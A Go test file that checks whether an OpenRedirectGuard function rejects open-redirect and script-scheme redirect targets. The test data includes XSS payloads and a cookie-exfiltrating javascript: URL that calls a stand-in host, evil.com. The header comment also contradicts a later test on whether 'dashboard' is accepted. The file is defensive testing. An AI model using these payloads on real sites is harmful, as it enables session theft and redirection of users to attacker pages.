// SPDX-License-Identifier: MIT
// Copyright (c) 2026 OgonFrameworks. All rights reserved.
//
// Open-redirect test (SEC-049). Verifies OpenRedirectGuard rejects:
//   - //evil.com      (protocol-relative URL → cross-origin)
//   - https://evil.com  (absolute foreign origin)
//   - javascript:alert(1)  (script scheme)
//   - data:text/html,...    (data URL)
//   - vbscript:...          (legacy script scheme)
// And accepts:
//   - /dashboard    (same-origin absolute path)
//   - dashboard      (relative path)
//   - ""             (empty → no redirect)
//   - allowed-host   (explicit allowlist)

package auth

import (
	"testing"
)

// TestOpenRedirectRejectsDoubleSlash: protocol-relative URL //evil.com
// must be rejected — browsers treat // as scheme-relative.
func TestOpenRedirectRejectsDoubleSlash(t *testing.T) {
	for _, target := range []string{
		"//evil.com",
		"//evil.com/path",
		"//attacker.example.com/x",
		"//evil.com:8080/",
	} {
		target := target
		t.Run(target, func(t *testing.T) {
			if err := OpenRedirectGuard(target, []string{"app.ogon.dev"}); err == nil {
				t.Fatalf("OpenRedirectGuard must reject %q", target)
			}
		})
	}
}

// TestOpenRedirectRejectsJavaScriptScheme: javascript: URLs execute
// in the browser's origin context — must be rejected.
func TestOpenRedirectRejectsJavaScriptScheme(t *testing.T) {
	for _, target := range []string{
		"javascript:alert(1)",
		"javascript:fetch('//evil.com/?c='+document.cookie)",
		"JaVaScRiPt:alert(document.domain)",
	} {
		target := target
		t.Run(target, func(t *testing.T) {
			if err := OpenRedirectGuard(target, []string{"app.ogon.dev"}); err == nil {
				t.Fatalf("OpenRedirectGuard must reject %q", target)
			}
		})
	}
}

// TestOpenRedirectRejectsDataScheme: data: URLs can serve text/html
// with arbitrary script — must be rejected.
func TestOpenRedirectRejectsDataScheme(t *testing.T) {
	for _, target := range []string{
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
	} {
		target := target
		t.Run(target, func(t *testing.T) {
			if err := OpenRedirectGuard(target, []string{"app.ogon.dev"}); err == nil {
				t.Fatalf("OpenRedirectGuard must reject %q", target)
			}
		})
	}
}

// TestOpenRedirectRejectsUnknownHost: absolute foreign origins are
// rejected unless on the allowlist.
func TestOpenRedirectRejectsUnknownHost(t *testing.T) {
	for _, target := range []string{
		"https://evil.com/path",
		"https://attacker.example.com/x",
		"http://malicious.org/",
	} {
		target := target
		t.Run(target, func(t *testing.T) {
			if err := OpenRedirectGuard(target, []string{"app.ogon.dev"}); err == nil {
				t.Fatalf("OpenRedirectGuard must reject %q", target)
			}
		})
	}
}

// TestOpenRedirectAllowsSameOrigin: same-origin paths are accepted. Only
// paths starting with "/" (and NOT "//") are accepted — relative paths
// without a leading slash (e.g. "dashboard") are rejected because they
// could be misinterpreted by browsers as scheme-relative.
func TestOpenRedirectAllowsSameOrigin(t *testing.T) {
	for _, target := range []string{
		"/dashboard",
		"/profile/edit",
		"/",
		"",
	} {
		target := target
		t.Run(target, func(t *testing.T) {
			if err := OpenRedirectGuard(target, []string{"app.ogon.dev"}); err != nil {
				t.Fatalf("OpenRedirectGuard should allow %q: %v", target, err)
			}
		})
	}
}

// TestOpenRedirectRejectsRelativeNoSlash: a relative path without a
// leading slash (e.g. "dashboard") is rejected — it could be
// misinterpreted as a scheme-less URL by some browsers.
func TestOpenRedirectRejectsRelativeNoSlash(t *testing.T) {
	if err := OpenRedirectGuard("dashboard", []string{"app.ogon.dev"}); err == nil {
		t.Fatal("OpenRedirectGuard must reject scheme-less relative paths")
	}
}

// TestOpenRedirectAllowsAllowlistHost: absolute URL on the allowlist.
func TestOpenRedirectAllowsAllowlistHost(t *testing.T) {
	allowed := []string{"app.ogon.dev", "cdn.ogon.dev"}
	for _, target := range []string{
		"https://app.ogon.dev/dashboard",
		"https://cdn.ogon.dev/asset/x.js",
	} {
		target := target
		t.Run(target, func(t *testing.T) {
			if err := OpenRedirectGuard(target, allowed); err != nil {
				t.Fatalf("OpenRedirectGuard should allow allowlisted %q: %v", target, err)
			}
		})
	}
}

// TestOpenRedirectRejectsVBScriptScheme: legacy script scheme must be
// rejected (IE-specific, but the guard must still deny).
func TestOpenRedirectRejectsVBScriptScheme(t *testing.T) {
	if err := OpenRedirectGuard("vbscript:msgbox(1)", nil); err == nil {
		t.Fatal("OpenRedirectGuard must reject vbscript: scheme")
	}
}
